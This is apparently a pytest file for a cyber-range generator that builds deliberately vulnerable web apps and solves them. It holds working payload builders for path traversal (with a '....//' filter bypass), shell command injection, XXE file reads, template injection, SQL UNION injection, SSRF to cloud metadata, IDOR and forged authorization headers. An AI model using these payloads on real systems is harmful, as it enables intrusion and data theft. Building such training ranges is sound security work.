"""Staged, constraint-propagating generation (packs/cyber_webapp/DESIGN.md).

The loot shape chosen first *bounds* the oracle's exploit shape, so a world is
solvable by construction. These drive the real pipeline end to end (no mocks):
a file-loot world admits, realizes, and is solved by a genuine path-traversal
HTTP exploit that recovers the flag from the in-memory file store.
"""

from __future__ import annotations

import base64
import json
import urllib.error
import urllib.parse
import urllib.request
from collections.abc import Mapping
from pathlib import Path

import pytest
from cyber_webapp import WebappPack
from cyber_webapp.codegen import _realize_graph
from cyber_webapp.vulnerabilities import CATALOG
from graphschema import WorldGraph
from openrange_pack_sdk import Snapshot

from openrange.core.admit import admit
from openrange.core.episode import EpisodeService


def _manifest(loot: str, seed: int = 7, **extra: object) -> dict[str, object]:
    return {
        "pack": {"id": "webapp"},
        "runtime": {"tick": {"mode": "off"}},
        "npc": [],
        "seed": seed,
        "loot_shapes": {loot: 1, "db" if loot == "file" else "file": 0},
        **extra,
    }


def _admit(loot: str, seed: int = 7, **extra: object) -> Snapshot:
    snap = admit(WebappPack(), manifest=_manifest(loot, seed, **extra), max_repairs=3)
    assert isinstance(snap, Snapshot), snap
    return snap


def _store_kinds(graph: WorldGraph) -> set[str]:
    return {str(n.attrs.get("kind")) for n in graph.by_kind("data_store")}


def _oracle_shapes(graph: WorldGraph) -> set[str]:
    shapes: set[str] = set()
    for vuln in graph.by_kind("vulnerability"):
        kind = str(vuln.attrs.get("kind", ""))
        if kind in CATALOG:
            shapes.add(CATALOG[kind].shape)
    return shapes


def test_file_loot_admits_and_forces_file_read_oracle() -> None:
    snap = _admit("file")
    assert "file" in _store_kinds(snap.graph)
    # File loot forces a file-store exploit (read or exec) as the oracle.
    assert _oracle_shapes(snap.graph) & {"file_read", "code_exec"}


def test_db_loot_admits_and_forces_response_leak_oracle() -> None:
    snap = _admit("db")
    assert "kv" in _store_kinds(snap.graph)
    assert "file" not in _store_kinds(snap.graph)
    # No db world has a file store, so no file-store exploit can be the oracle.
    assert not (_oracle_shapes(snap.graph) & {"file_read", "code_exec"})


def test_loot_shape_is_manifest_selectable() -> None:
    assert _store_kinds(_admit("file").graph) == {"file"}
    assert _store_kinds(_admit("db").graph) == {"kv"}


def test_file_loot_keeps_flag_out_of_db_and_secrets() -> None:
    # Shape purity: the flag lives only in the in-memory file map, so a stray
    # response-leak vuln can't shortcut the file-read challenge.
    snap = _admit("file")
    seed = json.loads(_realize_graph(snap.graph)["seed.json"])
    flag = str(snap.graph.nodes["secret_flag"].attrs["value_ref"])
    assert flag in seed["files"].values()
    assert not any(flag in str(row) for row in seed["records"].values())
    assert flag not in seed["secrets"].values()


def test_manifest_knobs_ignore_non_mapping_values() -> None:
    # A bad loot_shapes / vuln_kinds value is dropped, not crashed on.
    snap = admit(
        WebappPack(),
        manifest={
            "pack": {"id": "webapp"},
            "seed": 7,
            "runtime": {"tick": {"mode": "off"}},
            "npc": [],
            "loot_shapes": "not-a-mapping",
            "vuln_kinds": 5,
        },
        max_repairs=3,
    )
    assert isinstance(snap, Snapshot), snap


def test_degenerate_loot_weights_fall_back_to_db() -> None:
    # All-zero and non-int weights leave an empty pool, which resolves to db.
    for weights in ({"db": 0, "file": 0}, {"db": "lots", "file": True}):
        snap = admit(
            WebappPack(),
            manifest={
                "pack": {"id": "webapp"},
                "seed": 7,
                "runtime": {"tick": {"mode": "off"}},
                "npc": [],
                "loot_shapes": weights,
            },
            max_repairs=3,
        )
        assert isinstance(snap, Snapshot), snap
        assert _store_kinds(snap.graph) == {"kv"}


def test_file_loot_is_deterministic() -> None:
    assert _admit("file", seed=3).snapshot_id == _admit("file", seed=3).snapshot_id
    assert _admit("file", seed=3).snapshot_id != _admit("file", seed=4).snapshot_id


def _path_traversal_target(graph: WorldGraph) -> tuple[str, str, str]:
    """(endpoint public_url, query param, absolute flag file path)."""
    vuln = next(
        n
        for n in graph.by_kind("vulnerability")
        if n.attrs.get("kind") == "path_traversal"
    )
    params = vuln.attrs["params"]
    assert isinstance(params, Mapping)
    endpoint_id = next(e.dst for e in graph.out_edges(vuln.id, "affects"))
    return (
        str(graph.nodes[endpoint_id].attrs["public_url"]),
        str(params["target_param"]),
        _flag_record_key(graph),  # the flag's path, not a decoy file's
    )


def _flag_record_key(graph: WorldGraph) -> str:
    for record in graph.by_kind("record"):
        for edge in graph.out_edges(record.id, "holds"):
            if graph.nodes[edge.dst].attrs.get("kind") == "flag":
                return str(record.attrs["key"])
    raise AssertionError("no record holds the flag")


def _path_payload(params: Mapping[str, object], path: str) -> str:
    # Mutually exclusive confinement contexts, each accepting one traversal:
    #   absolute_only -> the raw absolute path (relative chains get stripped away)
    #   relative      -> a plain ../ chain (absolutes are re-anchored under base)
    #   dotdot_filter -> ....// , which survives the single-pass ../ strip
    conf = params.get("confinement", "absolute_only")
    if conf == "absolute_only":
        return path
    depth = len([s for s in str(params["base_dir"]).strip("/").split("/") if s])
    token = "....//" if conf == "dotdot_filter" else "../"
    return token * depth + path.lstrip("/")


def _cmdi_payload(params: Mapping[str, object], path: str) -> str:
    # Mutually exclusive injection contexts (the handler strips the others):
    #   substitution -> $() expansion (separators are stripped)
    #   quoted       -> break the sampled wrapping quote, THEN a separator
    #   separator    -> a bare metacharacter separator (substitution is stripped)
    ctx = params.get("inj_context", "separator")
    if ctx == "substitution":
        return f"$(cat {path})"
    if ctx == "quoted":
        q = str(params.get("quote", "'"))
        return f"{q}; cat {path}; echo {q}"
    return f"127.0.0.1; cat {path}"


def _xxe_payload(params: Mapping[str, object], path: str) -> str:
    ctx = params.get("entity_context", "element_content")
    if ctx == "wrapped_root":
        root = params["root_element"]
        # Nest the entity inside the sampled child (depth >= 2) so it slips past
        # element_content, which reflects only the root's direct (depth-1) text.
        return (
            f'<!DOCTYPE wrapper [<!ENTITY e SYSTEM "file://{path}">]>'
            f"<wrapper><{root}>&e;</{root}></wrapper>"
        )
    if ctx == "scheme_prefix":
        scheme = params["uri_scheme"]
        return f'<!DOCTYPE r [<!ENTITY e SYSTEM "{scheme}{path}">]><r>&e;</r>'
    return f'<!DOCTYPE r [<!ENTITY e SYSTEM "file://{path}">]><r>&e;</r>'


def _ssti_payload(params: Mapping[str, object], path: str) -> str:
    access = "config[" + repr(path) + "]"
    sink = params.get("render_sink", "attribute")
    if sink == "comment":
        return "#}{{ " + access + " }}{#"  # close the {# #} the handler adds
    if sink == "expr":
        return access  # bare expr: already inside {{ }}
    return "{{ " + access + " }}"


def _sqli_payload(params: Mapping[str, object]) -> str:
    union = f"UNION SELECT key, {params['leak_column']} FROM {params['table']} -- "
    ctx = params.get("context", "single")
    if ctx == "numeric":
        return f"0 {union}"  # unquoted predicate
    if ctx == "double":
        return f'" {union}'  # close the double-quoted literal
    return f"' {union}"  # close the single-quoted literal


def _ssrf_url(params: Mapping[str, object]) -> str:
    # Mutually exclusive evasions, each the only way past its build's filter:
    host = params["internal_host"]
    ctx = params.get("ssrf_filter", "decimal_ip")
    if ctx == "scheme_block":
        return f"gopher://{host}/_admin"  # http blocked; gopher reaches internal
    if ctx == "host_allowlist":
        return f"http://{params['allowed_host']}@{host}/latest/meta-data/"
    return f"http://{params['internal_decimal']}/"  # decimal_ip: bare decimal host


def _idor_id(params: Mapping[str, object], key: str) -> str:
    ctx = params.get("ref_context", "direct")
    if ctx == "base64":
        return base64.b64encode(key.encode()).decode()
    if ctx == "prefixed":
        return f"{params['ref_prefix']}{key}"
    return key


def _broken_authz_query(params: Mapping[str, object]) -> str:
    header = str(params["trust_header"])
    expected = str(params["expected_value"])
    ctx = params.get("trust_context", "single_token")
    if ctx == "encoded_token":
        forged = {header: expected.encode().hex()}
    elif ctx == "dual_factor":
        forged = {
            header: expected,
            str(params["confirm_param"]): str(params["confirm_value"]),
        }
    else:
        forged = {header: expected}
    return urllib.parse.urlencode(forged)


def _weak_cred_query(params: Mapping[str, object]) -> str:
    user, pw = params["weak_user"], params["weak_password"]
    carrier = str(params["password_param"])
    fmt = params.get("cred_format", "pair")
    if fmt == "combined":
        return f"{carrier}={urllib.parse.quote(f'{user}:{pw}')}"
    if fmt == "basic":
        token = base64.b64encode(f"{user}:{pw}".encode()).decode()
        return f"{carrier}={urllib.parse.quote(token)}"
    return (
        f"{params['user_param']}={urllib.parse.quote(str(user))}"
        f"&{carrier}={urllib.parse.quote(str(pw))}"
    )


def _exploit_url(kind: str, graph: WorldGraph, base: str) -> str:
    vuln = next(
        n for n in graph.by_kind("vulnerability") if n.attrs.get("kind") == kind
    )
    params = vuln.attrs["params"]
    assert isinstance(params, Mapping)
    endpoint_id = next(e.dst for e in graph.out_edges(vuln.id, "affects"))
    ep = str(graph.nodes[endpoint_id].attrs["public_url"])
    stem = f"{base}{ep}"

    def with_param(value: str) -> str:
        return f"{stem}?{params['target_param']}={urllib.parse.quote(value)}"

    if kind == "path_traversal":
        return with_param(_path_payload(params, _flag_record_key(graph)))
    if kind == "command_injection":
        return with_param(_cmdi_payload(params, _flag_record_key(graph)))
    if kind == "xxe":
        return with_param(_xxe_payload(params, _flag_record_key(graph)))
    if kind == "ssti":
        return with_param(_ssti_payload(params, _flag_record_key(graph)))
    if kind == "sql_injection":
        return with_param(_sqli_payload(params))
    if kind == "ssrf":
        return with_param(_ssrf_url(params))
    if kind == "idor":
        return with_param(_idor_id(params, _flag_record_key(graph)))
    if kind == "broken_authz":
        return f"{stem}?{_broken_authz_query(params)}"
    return f"{stem}?{_weak_cred_query(params)}"  # weak_credentials


@pytest.mark.parametrize(
    ("loot", "kind"),
    [
        ("file", "path_traversal"),
        ("file", "command_injection"),
        ("file", "xxe"),
        ("file", "ssti"),
        ("db", "sql_injection"),
        ("db", "ssrf"),
        ("db", "broken_authz"),
        ("db", "idor"),
        ("db", "weak_credentials"),
    ],
)
def test_fanout_class_episode_recovers_flag(
    loot: str, kind: str, tmp_path: Path
) -> None:
    # Each class is forced as the oracle and solved by its own
    # context-appropriate exploit; the recovered body must contain the flag.
    snap = _admit(loot, vuln_kinds={kind: 1})
    expected = str(snap.graph.nodes["secret_flag"].attrs["value_ref"])
    pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")

    svc = EpisodeService(WebappPack(), tmp_path)
    try:
        handle = svc.start_episode(snap, pentest.id)
        base = svc.surface(handle)["base_url"]
        recovered = (
            urllib.request.urlopen(_exploit_url(kind, snap.graph, base), timeout=10)
            .read()
            .decode()
        )
        assert expected in recovered, recovered[:120]
        (svc.solver_root(handle) / "result.json").write_text(
            json.dumps({"flag": expected})
        )
        report = svc.stop_episode(handle)
    finally:
        svc.close()
    assert report.passed, report.episode_result.reason


def test_flag_path_is_discoverable_via_config(tmp_path: Path) -> None:
    # The flag location is recon, not a blind guess: a config at a conventional
    # path discloses the flag path, which the same vuln then reads.
    import re

    snap = _admit("file", vuln_kinds={"path_traversal": 1})
    url_path, param, flag_path = _path_traversal_target(snap.graph)
    pt_vuln = next(
        n
        for n in snap.graph.by_kind("vulnerability")
        if n.attrs.get("kind") == "path_traversal"
    )
    params = pt_vuln.attrs["params"]
    assert isinstance(params, Mapping)
    expected = str(snap.graph.nodes["secret_flag"].attrs["value_ref"])
    pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")

    svc = EpisodeService(WebappPack(), tmp_path)
    try:
        handle = svc.start_episode(snap, pentest.id)
        base = svc.surface(handle)["base_url"]

        def read(path: str) -> str:
            # Read via this build's confinement-appropriate traversal.
            payload = urllib.parse.quote(_path_payload(params, path))
            url = f"{base}{url_path}?{param}={payload}"
            try:
                body: str = urllib.request.urlopen(url, timeout=10).read().decode()
            except urllib.error.HTTPError:
                return ""
            return body

        # The config sits at one of several conventional paths; probe each.
        disclosed = ""
        for conf in (
            "/etc/app/settings.conf",
            "/app/config.ini",
            "/srv/app/config/app.yaml",
            "/opt/app/conf/main.cfg",
        ):
            body = read(conf)
            match = re.search(r"backup_file = (\S+)", body)
            if match:
                disclosed = match.group(1)
                break
        assert disclosed == flag_path, disclosed
        assert expected in read(disclosed)
    finally:
        svc.close()


def test_path_traversal_feedback_distinguishes_attempt_from_benign(
    tmp_path: Path,
) -> None:
    # A neutralized traversal attempt returns 403 (right vuln class, wrong
    # technique); a benign filename miss returns 404. Neither recovers the flag.
    snap = _admit("file", vuln_kinds={"path_traversal": 1})
    url_path, param, _ = _path_traversal_target(snap.graph)
    pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")

    svc = EpisodeService(WebappPack(), tmp_path)
    codes: dict[str, int] = {}
    try:
        handle = svc.start_episode(snap, pentest.id)
        base = svc.surface(handle)["base_url"]
        for label, value in (("benign", "missing.txt"), ("attack", "../../../nope")):
            url = f"{base}{url_path}?{param}={urllib.parse.quote(value)}"
            try:
                urllib.request.urlopen(url, timeout=10)
                codes[label] = 200
            except urllib.error.HTTPError as exc:
                codes[label] = exc.code
        report = svc.stop_episode(handle)
    finally:
        svc.close()
    assert codes["benign"] == 404
    assert codes["attack"] == 403
    assert not report.passed


def test_command_injection_feedback_distinguishes_attempt_from_benign(
    tmp_path: Path,
) -> None:
    # A neutralized injection attempt (metacharacters the sampled context strips)
    # returns a response distinct from the benign diagnostic echo, no flag leak.
    snap = _admit("file", vuln_kinds={"command_injection": 1})
    vuln = next(
        n
        for n in snap.graph.by_kind("vulnerability")
        if n.attrs.get("kind") == "command_injection"
    )
    params = vuln.attrs["params"]
    assert isinstance(params, Mapping)
    flag_path = _flag_record_key(snap.graph)
    endpoint_id = next(e.dst for e in snap.graph.out_edges(vuln.id, "affects"))
    url_path = str(snap.graph.nodes[endpoint_id].attrs["public_url"])
    expected = str(snap.graph.nodes["secret_flag"].attrs["value_ref"])
    pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")
    # An injection vector the sampled context neutralizes (use the other one).
    if params.get("inj_context") == "substitution":
        wrong = f"x; cat {flag_path}"
    else:
        wrong = f"$(cat {flag_path})"

    svc = EpisodeService(WebappPack(), tmp_path)
    try:
        handle = svc.start_episode(snap, pentest.id)
        base = svc.surface(handle)["base_url"]

        def get(value: str) -> str:
            payload = urllib.parse.quote(value)
            url = f"{base}{url_path}?{params['target_param']}={payload}"
            body: str = urllib.request.urlopen(url, timeout=10).read().decode()
            return body

        benign = get("8.8.8.8")
        rejected = get(wrong)
    finally:
        svc.close()
    assert expected not in rejected
    assert benign != rejected


def test_context_payload_builders_cover_every_branch() -> None:
    # A single forced episode samples only one context per class, so exercise
    # every per-context payload builder here — each must differ by context.
    p = "/var/lib/app/x/secret.bak"
    assert _cmdi_payload({"inj_context": "separator"}, p).endswith(p)
    assert _cmdi_payload({"inj_context": "substitution"}, p) == f"$(cat {p})"
    assert _cmdi_payload({"inj_context": "quoted", "quote": '"'}, p) == (
        f'"; cat {p}; echo "'
    )

    base = {"base_dir": "/srv/app/public"}
    assert _path_payload({**base, "confinement": "absolute_only"}, p) == p
    assert _path_payload({**base, "confinement": "relative"}, p).startswith("../")
    dotdot = _path_payload({**base, "confinement": "dotdot_filter"}, p)
    assert dotdot.startswith("....//")

    assert "file://" in _xxe_payload({"entity_context": "element_content"}, p)
    assert "<feed>" in _xxe_payload(
        {"entity_context": "wrapped_root", "root_element": "feed"}, p
    )
    assert "vault://" in _xxe_payload(
        {"entity_context": "scheme_prefix", "uri_scheme": "vault://"}, p
    )

    assert _ssti_payload({"render_sink": "attribute"}, p).startswith("{{")
    assert _ssti_payload({"render_sink": "comment"}, p).startswith("#}")
    assert _ssti_payload({"render_sink": "expr"}, p).startswith("config[")

    sqli = {"table": "t", "leak_column": "c"}
    assert _sqli_payload({**sqli, "context": "single"}).startswith("'")
    assert _sqli_payload({**sqli, "context": "numeric"}).startswith("0")
    assert _sqli_payload({**sqli, "context": "double"}).startswith('"')

    host = {
        "internal_host": "169.254.169.254",
        "allowed_host": "ok.com",
        "internal_decimal": "2852039166",
    }
    assert "gopher://" in _ssrf_url({**host, "ssrf_filter": "scheme_block"})
    assert "@169" in _ssrf_url({**host, "ssrf_filter": "host_allowlist"})
    assert _ssrf_url({**host, "ssrf_filter": "decimal_ip"}) == "http://2852039166/"

    assert _idor_id({"ref_context": "direct"}, "k") == "k"
    assert _idor_id({"ref_context": "base64"}, "k") == base64.b64encode(b"k").decode()
    assert _idor_id({"ref_context": "prefixed", "ref_prefix": "u-"}, "k") == "u-k"

    authz = {"trust_header": "X-Role", "expected_value": "admin"}
    assert "X-Role=admin" in _broken_authz_query({**authz, "trust_context": "x"})
    dual = _broken_authz_query(
        {
            **authz,
            "trust_context": "dual_factor",
            "confirm_param": "X-Ok",
            "confirm_value": "1",
        }
    )
    assert "X-Ok=1" in dual
    encoded = _broken_authz_query({**authz, "trust_context": "encoded_token"})
    assert "admin" not in encoded

    cred = {
        "user_param": "u",
        "password_param": "p",
        "weak_user": "a",
        "weak_password": "b",
    }
    assert "u=a" in _weak_cred_query({**cred, "cred_format": "pair"})
    assert _weak_cred_query({**cred, "cred_format": "combined"}) == "p=a%3Ab"
    assert _weak_cred_query({**cred, "cred_format": "basic"}).startswith("p=")


def test_broken_authz_samples_all_trust_contexts() -> None:
    # One forced episode samples only one context, so cover all three here. The
    # confirm gate name is sampled for every context (so single/encoded can
    # reject a foreign dual forge), not just dual_factor.
    import random

    from cyber_webapp.sampling import default_vuln_params

    node = next(iter(_admit("db").graph.by_kind("endpoint")))
    seen = set()
    for seed in range(40):
        params = default_vuln_params("broken_authz", node, random.Random(seed))
        seen.add(params["trust_context"])
        assert "confirm_param" in params and "confirm_value" in params
    assert seen == {"single_token", "dual_factor", "encoded_token"}


def test_easy_tier_instruction_names_class_and_gives_recipe() -> None:
    # The easy tier's instruction names the vuln class and includes a concrete
    # payload recipe (a backtick code span), not just an abstract goal.
    expect = {
        "command_injection": "command injection",
        "ssti": "template injection",
        "path_traversal": "path traversal",
        "xxe": "xxe",
        "sql_injection": "sql injection",
        "ssrf": "server-side request forgery",
        "broken_authz": "broken authorization",
        "idor": "insecure direct object reference",
        "weak_credentials": "default credentials",
    }
    db = {"sql_injection", "ssrf", "broken_authz", "idor", "weak_credentials"}
    for kind, label in expect.items():
        loot = "db" if kind in db else "file"
        snap = _admit(loot, vuln_kinds={kind: 1}, difficulty="easy")
        task = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")
        assert task.meta.get("tier") == "easy"
        assert label in task.instruction.lower(), (kind, task.instruction)
        assert "`" in task.instruction  # a concrete payload/recipe code span


def test_standard_tier_stays_thin_and_aliases_map_to_easy() -> None:
    std = _admit("db", vuln_kinds={"sql_injection": 1})  # default = standard
    task = next(t for t in std.tasks if t.meta.get("family") == "webapp.pentest")
    assert task.meta.get("tier") == "standard"
    assert "guided" not in task.instruction.lower()
    for alias in ("guided", "bootstrap", "tutorial"):
        snap = _admit("db", vuln_kinds={"sql_injection": 1}, difficulty=alias)
        t = next(x for x in snap.tasks if x.meta.get("family") == "webapp.pentest")
        assert t.meta.get("tier") == "easy"


def test_exploit_hint_covers_every_context_branch() -> None:
    # A built world samples one context per class, so exercise every per-context
    # guidance branch here (the easy tier's payload recipe).
    from cyber_webapp.families.pentest import _exploit_hint

    loc = "/x/secret.bak"
    assert "$(cat" in _exploit_hint(
        "command_injection", {"inj_context": "substitution", "target_param": "q"}, loc
    )
    assert "echo" in _exploit_hint(
        "command_injection",
        {"inj_context": "quoted", "quote": '"', "target_param": "q"},
        loc,
    )
    assert "; cat" in _exploit_hint(
        "command_injection", {"inj_context": "separator", "target_param": "q"}, loc
    )

    sqli = {"table": "t", "leak_column": "c", "target_param": "q"}
    assert "UNION" in _exploit_hint(
        "sql_injection", {**sqli, "context": "numeric"}, loc
    )
    assert _exploit_hint("sql_injection", {**sqli, "context": "double"}, loc)
    assert _exploit_hint("sql_injection", {**sqli, "context": "single"}, loc)

    pt = {"base_dir": "/a/b", "target_param": "f"}
    assert "../" in _exploit_hint(
        "path_traversal", {**pt, "confinement": "relative"}, loc
    )
    assert "....//" in _exploit_hint(
        "path_traversal", {**pt, "confinement": "dotdot_filter"}, loc
    )
    assert "absolute" in _exploit_hint(
        "path_traversal", {**pt, "confinement": "absolute_only"}, loc
    )

    assert "#}" in _exploit_hint(
        "ssti", {"render_sink": "comment", "target_param": "x"}, loc
    )
    assert "config[" in _exploit_hint(
        "ssti", {"render_sink": "expr", "target_param": "x"}, loc
    )
    assert "{{" in _exploit_hint(
        "ssti", {"render_sink": "attribute", "target_param": "x"}, loc
    )

    assert "wrapper" in _exploit_hint(
        "xxe",
        {"entity_context": "wrapped_root", "root_element": "feed", "target_param": "d"},
        loc,
    )
    assert "vault" in _exploit_hint(
        "xxe",
        {
            "entity_context": "scheme_prefix",
            "uri_scheme": "vault://",
            "target_param": "d",
        },
        loc,
    )
    assert "file://" in _exploit_hint(
        "xxe", {"entity_context": "element_content", "target_param": "d"}, loc
    )

    assert "base64" in _exploit_hint(
        "idor", {"ref_context": "base64", "target_param": "id"}, loc
    )
    assert "prefix" in _exploit_hint(
        "idor",
        {"ref_context": "prefixed", "ref_prefix": "u-", "target_param": "id"},
        loc,
    )
    assert _exploit_hint("idor", {"ref_context": "direct", "target_param": "id"}, loc)

    wc = {
        "weak_user": "a",
        "weak_password": "b",
        "password_param": "p",
        "user_param": "u",
    }
    assert _exploit_hint("weak_credentials", {**wc, "cred_format": "combined"}, loc)
    assert "base64" in _exploit_hint(
        "weak_credentials", {**wc, "cred_format": "basic"}, loc
    )
    assert _exploit_hint("weak_credentials", {**wc, "cred_format": "pair"}, loc)

    ba = {"trust_header": "H", "expected_value": "v"}
    assert "Confirm" in _exploit_hint(
        "broken_authz",
        {
            **ba,
            "trust_context": "dual_factor",
            "confirm_param": "X-Confirm",
            "confirm_value": "1",
        },
        loc,
    )
    assert "hex" in _exploit_hint(
        "broken_authz", {**ba, "trust_context": "encoded_token"}, loc
    )
    assert _exploit_hint("broken_authz", {**ba, "trust_context": "single_token"}, loc)

    ss = {"internal_host": "h", "target_param": "u"}
    assert "gopher" in _exploit_hint("ssrf", {**ss, "ssrf_filter": "scheme_block"}, loc)
    assert "@" in _exploit_hint(
        "ssrf", {**ss, "ssrf_filter": "host_allowlist", "allowed_host": "ok"}, loc
    )
    assert _exploit_hint(
        "ssrf", {**ss, "ssrf_filter": "decimal_ip", "internal_decimal": "1"}, loc
    )

    assert _exploit_hint("unknown_kind", {}, loc)


def test_guided_helpers_handle_degenerate_graphs() -> None:
    # Defensive fallbacks in the guided-instruction helpers (the family only
    # builds a guided task when the chain exists, but cover the guards anyway).
    from cyber_webapp.families.pentest import _flag_location, _oracle_vuln
    from cyber_webapp.ontology import ONTOLOGY_ID
    from graphschema import Edge, Node

    graph = WorldGraph(ontology=ONTOLOGY_ID)
    graph.add_node(Node(id="ep", kind="endpoint", attrs={}))
    graph.add_node(Node(id="flag", kind="secret", attrs={}))
    assert _oracle_vuln(graph, "ep") is None  # no vuln at all
    assert _flag_location(graph, "flag") == ""  # no holding record

    # A vuln that affects a different node is not the oracle for ``ep``.
    graph.add_node(Node(id="other", kind="endpoint", attrs={}))
    graph.add_node(Node(id="v", kind="vulnerability", attrs={"kind": "sql_injection"}))
    graph.add_edge(Edge(id="a1", kind="affects", src="v", dst="other", attrs={}))
    assert _oracle_vuln(graph, "ep") is None

    # ...but a vuln affecting the SERVICE that exposes ``ep`` is found.
    graph.add_node(Node(id="svc", kind="service", attrs={}))
    graph.add_edge(Edge(id="x1", kind="exposes", src="svc", dst="ep", attrs={}))
    graph.add_edge(Edge(id="a2", kind="affects", src="v", dst="svc", attrs={}))
    assert _oracle_vuln(graph, "ep") is not None

    # A holds edge pointing at a missing record node falls through to "".
    graph.add_edge(Edge(id="h1", kind="holds", src="ghost", dst="flag", attrs={}))
    assert _flag_location(graph, "flag") == ""
